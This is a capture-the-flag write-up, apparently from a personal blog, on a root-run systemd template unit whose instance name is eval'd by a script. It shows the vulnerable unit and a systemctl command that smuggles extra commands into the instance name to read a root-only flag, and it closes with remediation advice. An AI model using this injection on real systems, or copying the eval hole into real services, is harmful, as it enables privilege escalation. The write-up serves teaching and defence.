# unit-eval — a systemd instance name that gets eval'd as root

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/unit-eval/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A systemd template unit `report@.service` passes its instance name
> `%i` **unquoted** to a script that `eval`s it, and the unit runs as root. By
> starting an instance whose name is a crafted payload, my command runs as root.
> **Flag:** read as root via the injected command.

## 1. Briefing

A box with a periodic "report generator". The interesting files are a systemd
template service, its timer, and the script they drive.

```ini
# report@.service
[Service]
Type=oneshot
# BAD: the instance name %i is passed unquoted to a script that eval's it.
ExecStart=/usr/local/bin/genreport.sh %i
```

```ini
# report.timer
[Timer]
OnCalendar=hourly
Unit=report@main.service
```

## 2. Analysis

Two facts combine:

1. `report@.service` is a **template unit** — the part after `@` becomes `%i`,
   and I choose it when I start an instance (`systemctl start 'report@<x>.service'`).
2. `genreport.sh` takes that `%i` and `eval`s it (sourcing `report.conf`,
   building a command line from the instance string). Unquoted `eval` on an
   attacker-chosen string is command injection, and the unit runs as root.

## 3. Exploitation

systemd unescapes the instance name, so I encode a payload as a valid unit
instance and start it:

```bash
# payload: run my command as root through the eval in genreport.sh
systemctl start 'report@main;id > /tmp/pwn;cat /root/flag*>/tmp/pwn.service'
cat /tmp/pwn
```

(The exact escaping uses `systemd-escape` so `;`, spaces and `/` survive into
`%i`; the point is that the string lands in an `eval` running as root.)

When the unit fires — immediately on `start`, or on the hourly timer — my command
runs with root privileges and I read the flag.

## 4. Flag

```text
NCTF{…}
```

## 5. Lessons & remediation

- **Never `eval` an instance name.** Treat `%i` as untrusted input; pass it as a
  single quoted argument (`"$1"`) and never through `eval`.
- **Lock down who can start template instances.** A root oneshot that any user
  can parametrise is a privilege boundary with a hole in it.
- Prefer explicit, fixed instances over free-form names when the unit is
  privileged.
